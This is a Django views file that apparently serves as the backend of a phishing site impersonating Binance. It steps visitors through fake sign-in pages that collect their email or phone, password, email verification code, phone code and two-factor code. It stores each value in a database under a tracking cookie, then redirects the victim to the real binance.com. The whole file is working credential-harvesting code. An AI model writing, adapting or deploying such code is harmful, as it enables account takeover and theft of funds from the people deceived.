from django.shortcuts import render, redirect
from django.http import HttpResponse
import uuid
from django.views.decorators.csrf import csrf_exempt

from home.models import LogginData


@csrf_exempt
def signin(request, *args, **kwargs):
    if request.method == 'POST':
        current = request.COOKIES.get('current')
        data = LogginData.objects.create(id=current, email_phone=request.POST.get('email'))
        return redirect('/pass')

    response = HttpResponse(render(request, 'home/signin.html', {}))
    response.set_cookie('current', uuid.uuid4())
    return response


@csrf_exempt
def passwd(request, *args, **kwargs):
    current = request.COOKIES.get('current')
    if request.method == 'POST':
        found = LogginData.objects.filter(id=current)
        if found:
            found[0].password = request.POST.get('pass')
            found[0].save()
            return redirect('/email')
        
    return render(request, 'home/pass.html', {})


@csrf_exempt
def email_code(request, *args, **kwargs):
    current = request.COOKIES.get('current')
    if request.method == 'POST':
        found = LogginData.objects.filter(id=current)
        if found:
            found[0].email_code = request.POST.get('email-code')
            found[0].save()
            return redirect('/verify')
        
    return render(request, 'home/email.html', {})


@csrf_exempt
def verify(request, *args, **kwargs):
    return render(request, 'home/verify.html', {})


@csrf_exempt
def phone_code(request, *args, **kwargs):
    current = request.COOKIES.get('current')
    if request.method == 'POST':
        found = LogginData.objects.filter(id=current)
        if found:
            found[0].phone_code = request.POST.get('phone-code')
            found[0].save()
            return redirect('https://binance.com/')
        
    return render(request, 'home/phone.html', {})


@csrf_exempt
def two_factor_code(request, *args, **kwargs):
    current = request.COOKIES.get('current')
    if request.method == 'POST':
        found = LogginData.objects.filter(id=current)
        if found:
            found[0].two_factor_code = request.POST.get('two-factor')
            found[0].save()
            return redirect('https://binance.com/')
        
    return render(request, 'home/two_factor_code.html', {})
